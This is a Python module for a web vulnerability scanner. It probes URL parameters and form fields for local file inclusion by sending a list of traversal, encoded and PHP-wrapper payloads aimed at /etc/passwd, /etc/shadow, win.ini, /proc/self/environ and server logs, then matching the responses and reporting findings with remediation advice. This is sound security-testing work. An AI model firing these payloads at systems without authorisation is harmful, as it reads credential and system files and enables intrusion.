"""Local File Inclusion (LFI) Scanner - OWASP A01:2021 / A05:2021."""
import re
from core.base_scanner import BaseScanner
from core.logger import vuln, debug

# (payload, detection_regex)
LFI_PAYLOADS = [
    # Linux /etc/passwd
    ("../etc/passwd",                    r"root:.*:0:0:"),
    ("../../etc/passwd",                 r"root:.*:0:0:"),
    ("../../../etc/passwd",              r"root:.*:0:0:"),
    ("../../../../etc/passwd",           r"root:.*:0:0:"),
    ("../../../../../etc/passwd",        r"root:.*:0:0:"),
    ("../../../../../../etc/passwd",     r"root:.*:0:0:"),
    ("../../../../../../../etc/passwd",  r"root:.*:0:0:"),
    # Null-byte bypass (PHP < 5.3)
    ("../etc/passwd%00",                 r"root:.*:0:0:"),
    ("../etc/passwd\x00",               r"root:.*:0:0:"),
    # Absolute path
    ("/etc/passwd",                      r"root:.*:0:0:"),
    ("/etc/shadow",                      r"root:\$"),
    # Windows paths
    ("..\\..\\..\\windows\\win.ini",     r"\[fonts\]|for 16-bit"),
    ("..\\..\\..\\.\\windows\\win.ini",  r"\[fonts\]|for 16-bit"),
    ("C:/windows/win.ini",              r"\[fonts\]|for 16-bit"),
    ("C:\\windows\\win.ini",            r"\[fonts\]|for 16-bit"),
    # Log poisoning candidates
    ("/proc/self/environ",               r"HTTP_USER_AGENT|PATH="),
    ("/proc/self/cmdline",               r"php|python|node|apache"),
    # PHP wrappers
    ("php://filter/convert.base64-encode/resource=index.php", r"[A-Za-z0-9+/]{40,}={0,2}"),
    ("php://filter/read=string.rot13/resource=index.php",     r"<?cuc|<\?rub"),
    ("php://input",                      r""),
    # Encoded traversals
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", r"root:.*:0:0:"),
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", r"root:.*:0:0:"),
    ("....//....//....//etc/passwd",     r"root:.*:0:0:"),
    # /etc/hosts, /etc/issue
    ("/etc/hosts",                       r"127\.0\.0\.1|localhost"),
    ("/etc/issue",                       r"Ubuntu|Debian|CentOS|Linux"),
    # Apache/Nginx logs
    ("/var/log/apache2/access.log",      r"GET /|HTTP/1"),
    ("/var/log/nginx/access.log",        r"GET /|HTTP/1"),
]

LFI_SIGNS = re.compile(
    r"root:.*:0:0:|daemon:.*:/usr/sbin|nobody:.*:/nonexistent|"
    r"\[fonts\]|for 16-bit app support|"
    r"127\.0\.0\.1.*localhost|"
    r"Ubuntu|Debian|CentOS|Red Hat|"
    r"HTTP_USER_AGENT=|DOCUMENT_ROOT=|"
    r"GET / HTTP/|\"GET /",
    re.IGNORECASE
)


class LFIScanner(BaseScanner):
    MODULE_NAME = "lfi"
    OWASP_CATEGORY = "A01:2021 - Broken Access Control"

    def scan(self, urls: list) -> list:
        findings = []
        tested = set()

        for url in urls:
            params = self.get_url_params(url)
            for param in params:
                key = f"{url}:{param}"
                if key in tested:
                    continue
                tested.add(key)

                for payload, sig in LFI_PAYLOADS:
                    injected = self.inject_param(url, param, payload)
                    resp = self.session.get(injected)
                    if not resp:
                        continue

                    matched = None
                    if sig and re.search(sig, resp.text, re.IGNORECASE):
                        matched = re.search(sig, resp.text, re.IGNORECASE)
                    elif not sig and LFI_SIGNS.search(resp.text):
                        matched = LFI_SIGNS.search(resp.text)

                    if matched:
                        start = max(0, matched.start() - 40)
                        evidence = resp.text[start:start + 250].strip()
                        f = self.make_finding(
                            url=url, param=param, payload=payload,
                            evidence=evidence[:300],
                            severity="CRITICAL",
                            description=(
                                f"Local File Inclusion: parameter '{param}' includes "
                                f"server-side files. Payload '{payload}' triggered a match."
                            ),
                            remediation=(
                                "Never pass user-controlled data to file-include functions. "
                                "Use a whitelist of allowed files. Disable allow_url_include in PHP. "
                                "Implement proper input validation and path canonicalization."
                            ),
                        )
                        vuln(f"  [VULN] LFI @ {url} | param={param} | payload={payload}")
                        findings.append(f)
                        break  # Move to next param after first hit

            # Also test forms
            forms = self.get_forms(url)
            for form in forms:
                for field in form["inputs"]:
                    key = f"form:{form['url']}:{field}"
                    if key in tested:
                        continue
                    tested.add(key)
                    for payload, sig in LFI_PAYLOADS[:12]:
                        results = self.test_form(form, payload, field_override=field)
                        for fname, resp in results:
                            if not resp:
                                continue
                            matched = None
                            if sig and re.search(sig, resp.text, re.IGNORECASE):
                                matched = re.search(sig, resp.text, re.IGNORECASE)
                            if matched:
                                f = self.make_finding(
                                    url=form["url"], param=field, payload=payload,
                                    evidence=resp.text[max(0, matched.start()-40):matched.start()+200].strip()[:300],
                                    severity="CRITICAL",
                                    description="LFI via form field: file content included in response.",
                                    remediation="Whitelist allowed files. Never pass user input to include/require.",
                                )
                                vuln(f"  [VULN] LFI (form) @ {form['url']} | field={field}")
                                findings.append(f)
                                break

        return findings
